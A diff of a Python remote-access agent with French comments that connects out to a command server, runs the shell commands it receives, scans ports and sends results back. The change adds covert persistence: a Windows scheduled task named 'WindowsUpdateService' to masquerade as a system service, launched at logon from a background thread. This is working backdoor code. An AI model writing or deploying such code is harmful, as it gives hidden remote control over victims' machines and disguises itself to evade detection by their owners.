@@ -1,16 +1,26 @@
 import socket
 import subprocess
+import os
+import sys
+import threading
 from PIL import ImageGrab
 
 ip_add = "127.0.0.1"
 port = 3280
+
+# Persitance
+def persistence():
+    exe_path = sys.executable #recupère le chemin du script
+    task_name = "WindowsUpdateService"
+
+    os.system(f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon >nul 2>&1') #création d'une tâche planifié pour exécuter au démarrage
 
 # Lance l'agent
 def start_agent(s):
     s.connect((ip_add, port))
     data_socket(s)
 
-# Reception et envoie des données
+# Recoie et envoie des données
 def data_socket(s):
     while True:
         request = s.recv(1024)
@@ -24,6 +34,7 @@ def data_socket(s):
                 result = scan_port(ip, port_range)
                 s.send(result.encode("utf-8"))
             except ValueError:
+                # Si la commande est mal formée, envoyer un message d'erreur au serveur
                 s.send(b"Invalid scan command. Use: scan <ip> <start_port>-<end_port>\n")
         else: 
             execute_command(s, command)
@@ -65,8 +76,10 @@ def scan_port(ip, port_range):
 
 
 if __name__ == "__main__":
+
+    persistence_thread = threading.Thread(target=persistence)
+    persistence_thread.daemon = True  # Permet au thread de se fermer quand le programme principal termine
+    persistence_thread.start()
+
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     start_agent(s)
-
-
-        
